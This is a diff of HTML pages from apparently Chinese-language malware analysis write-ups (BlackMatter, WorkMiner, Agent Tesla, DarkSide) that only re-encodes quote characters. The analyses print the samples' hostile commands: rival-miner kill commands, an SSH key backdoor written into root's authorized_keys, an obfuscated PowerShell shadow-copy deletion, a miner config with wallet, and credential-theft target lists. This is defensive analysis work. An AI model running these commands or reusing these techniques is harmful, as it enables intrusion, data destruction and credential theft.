-<pre tabindex="0"><code>&quot;encsvc&quot;、&quot;thebat&quot;、&quot;mydesktopqos&quot;、&quot;xfssvccon&quot;、&quot;firefox&quot;、&quot;infopath&quot;、&quot;winword&quot;、&quot;steam&quot;、&quot;synctime&quot;、&quot;notepad&quot;、&quot;ocomm&quot;、&quot;onenote&quot;、&quot;mspub&quot;、&quot;thunderbird&quot;、&quot;agntsvc&quot;、&quot;sql&quot;、&quot;excel&quot;、&quot;powerpnt&quot;、&quot;outlook&quot;、&quot;wordpad&quot;、&quot;dbeng50&quot;、&quot;isqlplussvc&quot;、&quot;sqbcoreservice&quot;、&quot;oracle&quot;、&quot;ocautoupds&quot;、&quot;dbsnmp&quot;、&quot;msaccess&quot;、&quot;tbirdconfig&quot;、&quot;ocssd&quot;、&quot;mydesktopservice&quot;、&quot;visio&quot;
+<pre tabindex="0"><code>&#34;encsvc&#34;、&#34;thebat&#34;、&#34;mydesktopqos&#34;、&#34;xfssvccon&#34;、&#34;firefox&#34;、&#34;infopath&#34;、&#34;winword&#34;、&#34;steam&#34;、&#34;synctime&#34;、&#34;notepad&#34;、&#34;ocomm&#34;、&#34;onenote&#34;、&#34;mspub&#34;、&#34;thunderbird&#34;、&#34;agntsvc&#34;、&#34;sql&#34;、&#34;excel&#34;、&#34;powerpnt&#34;、&#34;outlook&#34;、&#34;wordpad&#34;、&#34;dbeng50&#34;、&#34;isqlplussvc&#34;、&#34;sqbcoreservice&#34;、&#34;oracle&#34;、&#34;ocautoupds&#34;、&#34;dbsnmp&#34;、&#34;msaccess&#34;、&#34;tbirdconfig&#34;、&#34;ocssd&#34;、&#34;mydesktopservice&#34;、&#34;visio&#34;
 </code></pre><p><img src="/blackmatter_images/5616521163400.png" alt=""></p>
 <h4 id="657-io多线程加密">6.5.7. I/O多线程加密</h4>
 <p>创建用于处理<code>I/O</code>数据包的子线程，这些子线程使用<code>GetQueuedCompletionStatus</code>与<code>PostQueuedCompletionStatus</code>与主线程进行通信。接收到的数据包，都是需要处理的文件。</p>
@@ -1415,24 +2059,24 @@ OSMajorVersion 与 OSMinorVersion 对照表：https://docs.microsoft.com/en-us/w
 <p>执行命令终止其他挖矿进程</p>
 <p><img src="/workminer_images/980700198976.png" alt=""></p>
 <p>命令列表如下：</p>
-<pre tabindex="0"><code>ps -ef | grep ddg | grep -v grep | awk '{print $2}' | xargs kill -9
-ps -ef | grep xmr | grep -v grep | awk '{print $2}' | xargs kill -9
-ps -ef | grep tcp: | grep -v grep | awk '{print $2}' | xargs kill -9
-ps -ef | grep x86_ | grep -v grep | awk '{print $2}' | xargs kill -9
-ps -ef | grep miner | grep -v grep | awk '{print $2}' | xargs kill -9
-ps -ef | grep pool. | grep -v grep | awk '{print $2}' | xargs kill -9
-ps -ef | grep monero | grep -v grep | awk '{print $2}' | xargs kill -9
-ps -ef | grep prohash | grep -v grep | awk '{print $2}' | xargs kill -9
-ps -ef | grep stratum | grep -v grep | awk '{print $2}' | xargs kill -9
-ps -ef | grep .daemond | grep -v grep | awk '{print $2}' | xargs kill -9
-ps -ef | grep Circle_MI | grep -v grep | awk '{print $2}' | xargs kill -9
-ps -ef | grep kworker34 | grep -v grep | awk '{print $2}' | xargs kill -9
-ps -ef | grep cryptonight | grep -v grep | awk '{print $2}' | xargs kill -9
-ps -ef | grep /tmp/thisxxs | grep -v grep | awk '{print $2}' | xargs kill -9
-ps -ef | grep /usr/bin/.sshd | grep -v grep | awk '{print $2}' | xargs kill -9
-ps -ef | grep /opt/yilu/mservice | grep -v grep | awk '{print $2}' | xargs kill -9
-ps -ef | grep /opt/yilu/work/xig/xig | grep -v grep | awk '{print $2}' | xargs kill -9
-ps -ef | grep /usr/bin/bsd-port/getty | grep -v grep | awk '{print $2}' | xargs kill -9
+<pre tabindex="0"><code>ps -ef | grep ddg | grep -v grep | awk &#39;{print $2}&#39; | xargs kill -9
+ps -ef | grep xmr | grep -v grep | awk &#39;{print $2}&#39; | xargs kill -9
+ps -ef | grep tcp: | grep -v grep | awk &#39;{print $2}&#39; | xargs kill -9
+ps -ef | grep x86_ | grep -v grep | awk &#39;{print $2}&#39; | xargs kill -9
+ps -ef | grep miner | grep -v grep | awk &#39;{print $2}&#39; | xargs kill -9
+ps -ef | grep pool. | grep -v grep | awk &#39;{print $2}&#39; | xargs kill -9
+ps -ef | grep monero | grep -v grep | awk &#39;{print $2}&#39; | xargs kill -9
+ps -ef | grep prohash | grep -v grep | awk &#39;{print $2}&#39; | xargs kill -9
+ps -ef | grep stratum | grep -v grep | awk &#39;{print $2}&#39; | xargs kill -9
+ps -ef | grep .daemond | grep -v grep | awk &#39;{print $2}&#39; | xargs kill -9
+ps -ef | grep Circle_MI | grep -v grep | awk &#39;{print $2}&#39; | xargs kill -9
+ps -ef | grep kworker34 | grep -v grep | awk &#39;{print $2}&#39; | xargs kill -9
+ps -ef | grep cryptonight | grep -v grep | awk &#39;{print $2}&#39; | xargs kill -9
+ps -ef | grep /tmp/thisxxs | grep -v grep | awk &#39;{print $2}&#39; | xargs kill -9
+ps -ef | grep /usr/bin/.sshd | grep -v grep | awk &#39;{print $2}&#39; | xargs kill -9
+ps -ef | grep /opt/yilu/mservice | grep -v grep | awk &#39;{print $2}&#39; | xargs kill -9
+ps -ef | grep /opt/yilu/work/xig/xig | grep -v grep | awk &#39;{print $2}&#39; | xargs kill -9
+ps -ef | grep /usr/bin/bsd-port/getty | grep -v grep | awk &#39;{print $2}&#39; | xargs kill -9
 </code></pre><h3 id="文件释放">文件释放</h3>
 <p>检查是否存在环境变量<code>TMPDIR</code>，切换到<code>/tmp</code>目录下执行<code>killall xmr</code>命令，将系统命令：<code>wget</code>改为<code>wget1</code>、<code>curl</code>改为<code>curl1</code>：</p>
 <p><img src="/workminer_images/3871249213222.png" alt=""></p>
@@ -1440,76 +2084,76 @@ ps -ef | grep /usr/bin/bsd-port/getty | grep -v grep | awk '{print $2}' | xargs 
 <p><img src="/workminer_images/4658020187658.png" alt=""></p>
 <p>配置文件内容如下（其中包含了挖矿钱包）：</p>
 <pre tabindex="0"><code>{
-	&quot;api&quot;: {
-		&quot;id&quot;: null,
-		&quot;worker-id&quot;: null
+	&#34;api&#34;: {
+		&#34;id&#34;: null,
+		&#34;worker-id&#34;: null
 	},
-	&quot;http&quot;: {
-		&quot;enabled&quot;: false,
-		&quot;host&quot;: &quot;127001&quot;,
-		&quot;port&quot;: 0,
-		&quot;access-token&quot;: null,
-		&quot;restricted&quot;: true
+	&#34;http&#34;: {
+		&#34;enabled&#34;: false,
+		&#34;host&#34;: &#34;127001&#34;,
+		&#34;port&#34;: 0,
+		&#34;access-token&#34;: null,
+		&#34;restricted&#34;: true
 	},
-	&quot;autosave&quot;: true,
-	&quot;background&quot;: true,
-	&quot;colors&quot;: true,
-	&quot;title&quot;: true,
-	&quot;randomx&quot;: {
-		&quot;init&quot;: -1,
-		&quot;mode&quot;: &quot;auto&quot;,
-		&quot;1gb-pages&quot;: false,
-		&quot;rdmsr&quot;: true,
-		&quot;wrmsr&quot;: false,
-		&quot;numa&quot;: true
+	&#34;autosave&#34;: true,
+	&#34;background&#34;: true,
+	&#34;colors&#34;: true,
+	&#34;title&#34;: true,
+	&#34;randomx&#34;: {
+		&#34;init&#34;: -1,
+		&#34;mode&#34;: &#34;auto&#34;,
+		&#34;1gb-pages&#34;: false,
+		&#34;rdmsr&#34;: true,
+		&#34;wrmsr&#34;: false,
+		&#34;numa&#34;: true
 	},
-	&quot;cpu&quot;: {
-		&quot;enabled&quot;: true,
-		&quot;huge-pages&quot;: true,
-		&quot;hw-aes&quot;: null,
-		&quot;priority&quot;: null,
-		&quot;memory-pool&quot;: false,
-		&quot;yield&quot;: true,
-		&quot;argon2-impl&quot;: null,
-		&quot;astrobwt-max-size&quot;: 550,
-		&quot;astrobwt-avx2&quot;: false,
-		&quot;argon2&quot;: [0],
-		&quot;astrobwt&quot;: [-1],
-		&quot;cn&quot;: [
+	&#34;cpu&#34;: {
+		&#34;enabled&#34;: true,
+		&#34;huge-pages&#34;: true,
+		&#34;hw-aes&#34;: null,
+		&#34;priority&#34;: null,
+		&#34;memory-pool&#34;: false,
+		&#34;yield&#34;: true,
+		&#34;argon2-impl&#34;: null,
+		&#34;astrobwt-max-size&#34;: 550,
+		&#34;astrobwt-avx2&#34;: false,
+		&#34;argon2&#34;: [0],
+		&#34;astrobwt&#34;: [-1],
+		&#34;cn&#34;: [
 			[1, 0]
 		],
-		&quot;rx&quot;: [0],
-		&quot;rx/wow&quot;: [0],
-		&quot;cn/0&quot;: false,
-		&quot;rx/arq&quot;: &quot;rx/wow&quot;,
-		&quot;rx/keva&quot;: &quot;rx/wow&quot;
+		&#34;rx&#34;: [0],
+		&#34;rx/wow&#34;: [0],
+		&#34;cn/0&#34;: false,
+		&#34;rx/arq&#34;: &#34;rx/wow&#34;,
+		&#34;rx/keva&#34;: &#34;rx/wow&#34;
 	},
-	&quot;donate-level&quot;: 0,
-	&quot;donate-over-proxy&quot;: 1,
-	&quot;log-file&quot;: null,
-	&quot;pools&quot;: [{
-		&quot;algo&quot;: null,
-		&quot;coin&quot;: null,
-		&quot;url&quot;: &quot;xmrcrypto-poolfr:6666&quot;,
-		&quot;user&quot;: &quot;47BD6QNfkWf8ZMQSdqp2tY1AdG8ofsEPf4mcDp1YB4AX32hUjoLjuDaNrYzXk7cQcoPBzAuQrmQTgNgpo6XPqSBLCnfsjaV&quot;,
-		&quot;pass&quot;: &quot;x&quot;,
-		&quot;rig-id&quot;: null,
-		&quot;nicehash&quot;: false,
-		&quot;keepalive&quot;: false,
-		&quot;enabled&quot;: true,
-		&quot;tls&quot;: false,
-		&quot;tls-fingerprint&quot;: null,
-		&quot;daemon&quot;: false,
-		&quot;socks5&quot;: null,
-		&quot;self-select&quot;: null
+	&#34;donate-level&#34;: 0,
+	&#34;donate-over-proxy&#34;: 1,
+	&#34;log-file&#34;: null,
+	&#34;pools&#34;: [{
+		&#34;algo&#34;: null,
+		&#34;coin&#34;: null,
+		&#34;url&#34;: &#34;xmrcrypto-poolfr:6666&#34;,
+		&#34;user&#34;: &#34;47BD6QNfkWf8ZMQSdqp2tY1AdG8ofsEPf4mcDp1YB4AX32hUjoLjuDaNrYzXk7cQcoPBzAuQrmQTgNgpo6XPqSBLCnfsjaV&#34;,
+		&#34;pass&#34;: &#34;x&#34;,
+		&#34;rig-id&#34;: null,
+		&#34;nicehash&#34;: false,
+		&#34;keepalive&#34;: false,
+		&#34;enabled&#34;: true,
+		&#34;tls&#34;: false,
+		&#34;tls-fingerprint&#34;: null,
+		&#34;daemon&#34;: false,
+		&#34;socks5&#34;: null,
+		&#34;self-select&#34;: null
 	}],
-	&quot;print-time&quot;: 60,
-	&quot;retries&quot;: 5,
-	&quot;retry-pause&quot;: 5,
-	&quot;syslog&quot;: false,
-	&quot;user-agent&quot;: null,
-	&quot;verbose&quot;: 0,
-	&quot;watch&quot;: true
+	&#34;print-time&#34;: 60,
+	&#34;retries&#34;: 5,
+	&#34;retry-pause&#34;: 5,
+	&#34;syslog&#34;: false,
+	&#34;user-agent&#34;: null,
+	&#34;verbose&#34;: 0,
+	&#34;watch&#34;: true
 }
 </code></pre><p>将<code>elf</code>格式的二进制文件写入到<code>/tmp/xmr</code>中：</p>
 <p><img src="/workminer_images/2204351171322.png" alt=""></p>
@@ -1522,15 +2166,15 @@ ps -ef | grep /usr/bin/bsd-port/getty | grep -v grep | awk '{print $2}' | xargs 
 
 LIMIT=8
 while true ; do
-    TIME=$(date '+%b %e %H')     #example: Apr 11 11
-    BLOCK_IP=$(grep &quot;$TIME&quot; /var/log/secure|grep Failed|awk '{print $(NF-3)}'|sort|uniq -c|awk '$1&gt;&quot;$LIMIT&quot;{print $1&quot;:&quot;$2}')
+    TIME=$(date &#39;+%b %e %H&#39;)     #example: Apr 11 11
+    BLOCK_IP=$(grep &#34;$TIME&#34; /var/log/secure|grep Failed|awk &#39;{print $(NF-3)}&#39;|sort|uniq -c|awk &#39;$1&gt;&#34;$LIMIT&#34;{print $1&#34;:&#34;$2}&#39;)
     for i in $BLOCK_IP
     do
-        IP=$(echo $i|awk -F: '{print $2}')
+        IP=$(echo $i|awk -F: &#39;{print $2}&#39;)
         grep $IP /etc/hosts.deny &gt; /dev/null
         if [ $? -gt 0 ];
         then
-            echo &quot;sshd:$IP&quot; &gt;&gt; /etc/hosts.deny
+            echo &#34;sshd:$IP&#34; &gt;&gt; /etc/hosts.deny
         fi
     done
     sleep 60
@@ -1542,15 +2186,15 @@ done
 
 LIMIT=8
 while true ; do
-    TIME=$(date '+%b %e %H')     #example: Apr 11 11
-    BLOCK_IP=$(grep &quot;$TIME&quot; /var/log/auth.log|grep Failed|awk '{print $(NF-3)}'|sort|uniq -c|awk '$1&gt;&quot;$LIMIT&quot;{print $1&quot;:&quot;$2}')
+    TIME=$(date &#39;+%b %e %H&#39;)     #example: Apr 11 11
+    BLOCK_IP=$(grep &#34;$TIME&#34; /var/log/auth.log|grep Failed|awk &#39;{print $(NF-3)}&#39;|sort|uniq -c|awk &#39;$1&gt;&#34;$LIMIT&#34;{print $1&#34;:&#34;$2}&#39;)
     for i in $BLOCK_IP
     do
-        IP=$(echo $i|awk -F: '{print $2}')
+        IP=$(echo $i|awk -F: &#39;{print $2}&#39;)
         grep $IP /etc/hosts.deny &gt; /dev/null
         if [ $? -gt 0 ];
         then
-            echo &quot;sshd:$IP&quot; &gt;&gt; /etc/hosts.deny
+            echo &#34;sshd:$IP&#34; &gt;&gt; /etc/hosts.deny
         fi
     done
     sleep 60
@@ -1565,7 +2209,7 @@ done
 <p>生成<code>/root/.ssh/authorized_keys</code>，设置权限为<code>600</code>，并使用<code>echo</code>写入内容：</p>
 <p><img src="/workminer_images/5574831203213.png" alt=""></p>
 <p>写入公钥命令为：</p>
-<pre tabindex="0"><code>echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDc3BlbiQaznPT8TScrs9YIzmrpI9Lpa4LtCjB5z0LuQ4o6XwvzomxAixn2F1jaUl175Cxcg3PmUsPOLE+WeWicKqL2YZ46SotjZgnS6JjXpuZVi7V0DSiXu0itlwWDC9m8huBvUBSIsDCsgb9OeG6rlrCyZgTW+qZciK+KZ8rwlFp3CFyxoF2122ueOnl5pAUCy1iHqGun03dMdUxA1d3KnxSZ3NQrYiH69dc8/YhV4SriOW9psc0pv9KeBLF0OXHtEAdbnSlwfk2uTjjBMK0nDidl7wS52Ygi/H4+P+4EXkSzf4Jj4/L6P3c5rLC3/l3RFdo1T7EQ8fH6NsTYJNZ7 root@u911&quot; &gt;&gt; /root/.ssh/authorized_keys
+<pre tabindex="0"><code>echo &#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDc3BlbiQaznPT8TScrs9YIzmrpI9Lpa4LtCjB5z0LuQ4o6XwvzomxAixn2F1jaUl175Cxcg3PmUsPOLE+WeWicKqL2YZ46SotjZgnS6JjXpuZVi7V0DSiXu0itlwWDC9m8huBvUBSIsDCsgb9OeG6rlrCyZgTW+qZciK+KZ8rwlFp3CFyxoF2122ueOnl5pAUCy1iHqGun03dMdUxA1d3KnxSZ3NQrYiH69dc8/YhV4SriOW9psc0pv9KeBLF0OXHtEAdbnSlwfk2uTjjBMK0nDidl7wS52Ygi/H4+P+4EXkSzf4Jj4/L6P3c5rLC3/l3RFdo1T7EQ8fH6NsTYJNZ7 root@u911&#34; &gt;&gt; /root/.ssh/authorized_keys
 </code></pre><p>检测是否存在以下文件：</p>
 <pre tabindex="0"><code>/etc/rc.d/rc.local
 /etc/rc.local
@@ -1723,7 +2367,7 @@ SHA256：cc262fd3fa1f646aff2f5bcdea33beca5ed081260028b8604d5f714dd23c03ac
 <p><img src="/tesla_images/1697150189976.png" alt=""></p>
 <p><code>de4dot</code>对<code>--strtyp</code>参数的说明如下：</p>
 <pre tabindex="0"><code>String decrypter types
-  none             Don't decrypt strings
+  none             Don&#39;t decrypt strings
   default          Use default string decrypter type (usually static)
   static           Use static string decrypter if available
   delegate         Use a delegate to call the real string decrypter
@@ -1793,48 +2437,48 @@ rename dump3-cleaned.bin dump3.bin
 <p>从Edge凭证窃取函数可以看出，窃取函数存在以下特征：</p>
 <pre tabindex="0"><code>UserName =
 Password =
-Browser = &quot;&quot;
+Browser = &#34;&#34;
 </code></pre><p>检索全部代码，反复确认后，发现窃取目标包含以下对象：</p>
-<pre tabindex="0"><code>Browser = &quot;IE/Edge&quot;
-Browser = &quot;Edge Chromium&quot;
-Browser = &quot;QQ Browser&quot;
-Browser = &quot;incredimail&quot;
-x.Browser = &quot;Eudora&quot;
-Browser = &quot;Falkon Browser&quot;
-Browser = &quot;Falkon Browser&quot;
-Browser = &quot;ClawsMail&quot;
-Browser = &quot;Flock Browser&quot;
-Browser = &quot;DynDNS&quot;
-x.Browser = &quot;Psi/Psi+&quot;
-x.Browser = &quot;Open VPN&quot;
-x.Browser = &quot;FileZilla&quot;
-Browser = &quot;WinSCP&quot;
-Browser = &quot;FlashFXP&quot;
-x.Browser = &quot;FTP Navigator&quot;
-x.Browser = &quot;JDownloader&quot;
-Browser = &quot;Paltalk&quot;
-Browser = &quot;Pidgin&quot;
-Browser = &quot;SmartFTP&quot;
-x.Browser = &quot;WS_FTP&quot;
-Browser = &quot;FTPCommander&quot;
-x.Browser = &quot;FTPGetter&quot;
-Browser = &quot;NO-IP&quot;
-Browser = &quot;NO-IP&quot;
-Browser = &quot;TheBat&quot;
-x.Browser = &quot;Becky!&quot;
-Browser = &quot;Trillian&quot;
-x.Browser = &quot;Outlook&quot;
-x.Browser = &quot;Foxmail&quot;
-x.Browser = &quot;Opera Mail&quot;
-x.Browser = &quot;PocoMail&quot;
-Browser = &quot;eM Client&quot;
-x.Browser = &quot;Mailbird&quot;
-x.Browser = &quot;Mailbird&quot;
-Browser = &quot;NordVPN&quot;
-Browser = &quot;MySQL Workbench&quot;
-Browser = &quot;Private Internet Access&quot;
-x.Browser = &quot;Safari Browser&quot;
-x.Browser = &quot;Internet Download Manager&quot;
+<pre tabindex="0"><code>Browser = &#34;IE/Edge&#34;
+Browser = &#34;Edge Chromium&#34;
+Browser = &#34;QQ Browser&#34;
+Browser = &#34;incredimail&#34;
+x.Browser = &#34;Eudora&#34;
+Browser = &#34;Falkon Browser&#34;
+Browser = &#34;Falkon Browser&#34;
+Browser = &#34;ClawsMail&#34;
+Browser = &#34;Flock Browser&#34;
+Browser = &#34;DynDNS&#34;
+x.Browser = &#34;Psi/Psi+&#34;
+x.Browser = &#34;Open VPN&#34;
+x.Browser = &#34;FileZilla&#34;
+Browser = &#34;WinSCP&#34;
+Browser = &#34;FlashFXP&#34;
+x.Browser = &#34;FTP Navigator&#34;
+x.Browser = &#34;JDownloader&#34;
+Browser = &#34;Paltalk&#34;
+Browser = &#34;Pidgin&#34;
+Browser = &#34;SmartFTP&#34;
+x.Browser = &#34;WS_FTP&#34;
+Browser = &#34;FTPCommander&#34;
+x.Browser = &#34;FTPGetter&#34;
+Browser = &#34;NO-IP&#34;
+Browser = &#34;NO-IP&#34;
+Browser = &#34;TheBat&#34;
+x.Browser = &#34;Becky!&#34;
+Browser = &#34;Trillian&#34;
+x.Browser = &#34;Outlook&#34;
+x.Browser = &#34;Foxmail&#34;
+x.Browser = &#34;Opera Mail&#34;
+x.Browser = &#34;PocoMail&#34;
+Browser = &#34;eM Client&#34;
+x.Browser = &#34;Mailbird&#34;
+x.Browser = &#34;Mailbird&#34;
+Browser = &#34;NordVPN&#34;
+Browser = &#34;MySQL Workbench&#34;
+Browser = &#34;Private Internet Access&#34;
+x.Browser = &#34;Safari Browser&#34;
+x.Browser = &#34;Internet Download Manager&#34;
 </code></pre><h4 id="3315-vnc凭证窃取">3.3.15. VNC凭证窃取</h4>
 <p><img src="/tesla_images/1320920203013.png" alt=""></p>
 <h4 id="3316-下载tor浏览器">3.3.16. 下载Tor浏览器</h4>
@@ -1843,32 +2487,32 @@ x.Browser = &quot;Internet Download Manager&quot;
 <p>进入程序入口，会生成一串字符串，用于标识受害者主机，然后会设置一个30s的定时循环任务，接着开始进行浏览器用户数据窃取；</p>
 <p><img src="/tesla_images/2016144140664.png" alt=""></p>
 <p>汇总如下：</p>
-<pre tabindex="0"><code>@&quot;C:\Users\alee\AppData\Local\7Star\7Star\User Data&quot;
-@&quot;C:\Users\alee\AppData\Local\uCozMedia\Uran\User Data&quot;
-@&quot;C:\Users\alee\AppData\Local\MapleStudio\ChromePlus\User Data&quot;
-@&quot;C:\Users\alee\AppData\Local\Yandex\YandexBrowser\User Data&quot;
-@&quot;C:\Users\alee\AppData\Local\Torch\User Data&quot;
-@&quot;C:\Users\alee\AppData\Local\Coowon\Coowon\User Data&quot;
-@&quot;C:\Users\alee\AppData\Local\Comodo\Dragon\User Data&quot;
-@&quot;C:\Users\alee\AppData\Local\Sputnik\Sputnik\User Data&quot;
-@&quot;C:\Users\alee\AppData\Local\Iridium\User Data&quot;
-@&quot;C:\Users\alee\AppData\Local\Vivaldi\User Data&quot;
-@&quot;C:\Users\alee\AppData\Roaming\Opera Software\Opera Stable&quot;
-@&quot;C:\Users\alee\AppData\Local\Chedot\User Data&quot;
-@&quot;C:\Users\alee\AppData\Local\CocCoc\Browser\User Data&quot;
-@&quot;C:\Users\alee\AppData\Local\Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer&quot;
-@&quot;C:\Users\alee\AppData\Local\Epic Privacy Browser\User Data&quot;
-@&quot;C:\Users\alee\AppData\Local\Elements Browser\User Data&quot;
-@&quot;C:\Users\alee\AppData\Local\Amigo\User Data&quot;
-@&quot;C:\Users\alee\AppData\Local\CatalinaGroup\Citrio\User Data&quot;
-@&quot;C:\Users\alee\AppData\Local\BraveSoftware\Brave-Browser\User Data&quot;
-@&quot;C:\Users\alee\AppData\Local\360Chrome\Chrome\User Data&quot;
-@&quot;C:\Users\alee\AppData\Local\Kometa\User Data&quot;
-@&quot;C:\Users\alee\AppData\Local\liebao\User Data&quot;
-@&quot;C:\Users\alee\AppData\Local\CentBrowser\User Data&quot;
-@&quot;C:\Users\alee\AppData\Local\QIP Surf\User Data&quot;
-@&quot;C:\Users\alee\AppData\Local\Chromium\User Data&quot;
-@&quot;C:\Users\alee\AppData\Local\Orbitum\User Data&quot;
+<pre tabindex="0"><code>@&#34;C:\Users\alee\AppData\Local\7Star\7Star\User Data&#34;
+@&#34;C:\Users\alee\AppData\Local\uCozMedia\Uran\User Data&#34;
+@&#34;C:\Users\alee\AppData\Local\MapleStudio\ChromePlus\User Data&#34;
+@&#34;C:\Users\alee\AppData\Local\Yandex\YandexBrowser\User Data&#34;
+@&#34;C:\Users\alee\AppData\Local\Torch\User Data&#34;
+@&#34;C:\Users\alee\AppData\Local\Coowon\Coowon\User Data&#34;
+@&#34;C:\Users\alee\AppData\Local\Comodo\Dragon\User Data&#34;
+@&#34;C:\Users\alee\AppData\Local\Sputnik\Sputnik\User Data&#34;
+@&#34;C:\Users\alee\AppData\Local\Iridium\User Data&#34;
+@&#34;C:\Users\alee\AppData\Local\Vivaldi\User Data&#34;
+@&#34;C:\Users\alee\AppData\Roaming\Opera Software\Opera Stable&#34;
+@&#34;C:\Users\alee\AppData\Local\Chedot\User Data&#34;
+@&#34;C:\Users\alee\AppData\Local\CocCoc\Browser\User Data&#34;
+@&#34;C:\Users\alee\AppData\Local\Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer&#34;
+@&#34;C:\Users\alee\AppData\Local\Epic Privacy Browser\User Data&#34;
+@&#34;C:\Users\alee\AppData\Local\Elements Browser\User Data&#34;
+@&#34;C:\Users\alee\AppData\Local\Amigo\User Data&#34;
+@&#34;C:\Users\alee\AppData\Local\CatalinaGroup\Citrio\User Data&#34;
+@&#34;C:\Users\alee\AppData\Local\BraveSoftware\Brave-Browser\User Data&#34;
+@&#34;C:\Users\alee\AppData\Local\360Chrome\Chrome\User Data&#34;
+@&#34;C:\Users\alee\AppData\Local\Kometa\User Data&#34;
+@&#34;C:\Users\alee\AppData\Local\liebao\User Data&#34;
+@&#34;C:\Users\alee\AppData\Local\CentBrowser\User Data&#34;
+@&#34;C:\Users\alee\AppData\Local\QIP Surf\User Data&#34;
+@&#34;C:\Users\alee\AppData\Local\Chromium\User Data&#34;
+@&#34;C:\Users\alee\AppData\Local\Orbitum\User Data&#34;
 </code></pre><p>然后会在每一个目录下寻找<code>logins</code>文件夹，窃取其中的信息</p>
 <p><img src="/tesla_images/4256159090.png" alt=""></p>
 <p>针对<code>logins</code>内的文件窃取函数内容如下：</p>
@@ -2128,20 +2772,20 @@ cmp dword ptr ds:[eax+0xC], 0x220
 <h4 id="发送信息至服务器函数">发送信息至服务器函数</h4>
 <p>将本地的系统相关信息发送到攻击者的服务器：json格式内容如下：</p>
 <pre tabindex="0"><code>{
-	&quot;bot&quot;:{
-	&quot;ver&quot;:&quot;1.8.6.2&quot;,
-	&quot;uid&quot;:&quot;060108efb510c98&quot;
+	&#34;bot&#34;:{
+	&#34;ver&#34;:&#34;1.8.6.2&#34;,
+	&#34;uid&#34;:&#34;060108efb510c98&#34;
 	},
-	&quot;os&quot;:{
-	&quot;lang&quot;:&quot;zh-CN&quot;,
-	&quot;username&quot;:&quot;alee&quot;,
-	&quot;hostname&quot;:&quot;WIN-B1ESUN1R9U8&quot;,
-	&quot;domain&quot;:&quot;WORKGROUP&quot;,
-	&quot;os_type&quot;:&quot;windows&quot;,
-	&quot;os_version&quot;:&quot;Windows 7 Ultimate&quot;,
-	&quot;os_arch&quot;:&quot;x64&quot;,
-	&quot;disks&quot;:&quot;C:72/99&quot;,
-	&quot;id&quot;:&quot;826dfd7bd5985bdbd259&quot;
+	&#34;os&#34;:{
+	&#34;lang&#34;:&#34;zh-CN&#34;,
+	&#34;username&#34;:&#34;alee&#34;,
+	&#34;hostname&#34;:&#34;WIN-B1ESUN1R9U8&#34;,
+	&#34;domain&#34;:&#34;WORKGROUP&#34;,
+	&#34;os_type&#34;:&#34;windows&#34;,
+	&#34;os_version&#34;:&#34;Windows 7 Ultimate&#34;,
+	&#34;os_arch&#34;:&#34;x64&#34;,
+	&#34;disks&#34;:&#34;C:72/99&#34;,
+	&#34;id&#34;:&#34;826dfd7bd5985bdbd259&#34;
 	}
 }
 </code></pre><p>服务器为：<code>securebestapp20.com</code></p>
@@ -2149,7 +2793,7 @@ cmp dword ptr ds:[eax+0xC], 0x220
 <p>核心代码如下：</p>
 <p><img src="/darkside_images/5604835168666.png" alt=""></p>
 <p>powershell命令如下：</p>
-<pre tabindex="0"><code>40B5E2:L&quot;powershell -ep bypass -c \&quot;(0..61)|%{{$s+=[char][byte]('0x'+'4765742D576D694F626A6563742057696E33325F536861646F77636F7079207C20466F72456163682D4F626A656374207B245F2E44656C65746528293B7D20'.Substring(2*$_,2))}};iex $s\&quot;&quot;
+<pre tabindex="0"><code>40B5E2:L&#34;powershell -ep bypass -c \&#34;(0..61)|%{{$s+=[char][byte](&#39;0x&#39;+&#39;4765742D576D694F626A6563742057696E33325F536861646F77636F7079207C20466F72456163682D4F626A656374207B245F2E44656C65746528293B7D20&#39;.Substring(2*$_,2))}};iex $s\&#34;&#34;
 </code></pre><p>将十六进制转换成字符串如下：</p>
 <pre tabindex="0"><code>Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}
 </code></pre><h4 id="检索本地磁盘空闲空间">检索本地磁盘空闲空间</h4>
@@ -2170,7 +2814,7 @@ cmp dword ptr ds:[eax+0xC], 0x220
 <p>自我删除的主函数如下：</p>
 <p><img src="/darkside_images/33802100566.png" alt=""></p>
 <p>使用<code>Procmon</code>检测到的指令如下：</p>
-<pre tabindex="0"><code>&quot;C:\Windows\system32\cmd.exe&quot; /C DEL /F /Q C:\Users\alee\Desktop\DARKSI~1\Darkside.exe &gt;&gt; NUL
+<pre tabindex="0"><code>&#34;C:\Windows\system32\cmd.exe&#34; /C DEL /F /Q C:\Users\alee\Desktop\DARKSI~1\Darkside.exe &gt;&gt; NUL
 </code></pre><p>在命令行使用<code>cmd /?</code>可以了解到：</p>
 <pre tabindex="0"><code>/C      执行字符串指定的命令然后终止
 /Q      关闭回显
@@ -2202,7 +2846,7 @@ cmp dword ptr ds:[eax+0xC], 0x220
 <p>这是我分析的第一个样本，其中一定会有遗漏的地方，以及牵强之处，希望大家多多批评指正。</p>
 <h2 id="1-行为捕获">1. 行为捕获</h2>
 <p>直接运行样本，并使用火绒剑进行行为捕获：</p>
-<pre tabindex="0"><code>16:43:31:605,	tsay.exe,	1064:0,	1064,	EXEC_create,	C:\Users\ALEE\Desktop\incaseformat\tsay.exe,	parent_pid:4700 cmdline:'&quot;C:\Users\ALEE\Desktop\incaseformat\tsay.exe&quot; ' image_base:0x0000000000400000 image_size:0x00077000 ,	0x00000000 [操作成功完成。  ],	
+<pre tabindex="0"><code>16:43:31:605,	tsay.exe,	1064:0,	1064,	EXEC_create,	C:\Users\ALEE\Desktop\incaseformat\tsay.exe,	parent_pid:4700 cmdline:&#39;&#34;C:\Users\ALEE\Desktop\incaseformat\tsay.exe&#34; &#39; image_base:0x0000000000400000 image_size:0x00077000 ,	0x00000000 [操作成功完成。  ],	
 16:43:31:745,	tsay.exe,	1064:0,	1064,	EXEC_module_load,	C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_5.82.19041.488_none_89e6152f0b32762e\comctl32.dll,	base:0x0000000074DB0000 size:0x0008D000 ,	0x00000000 [操作成功完成。  ],	
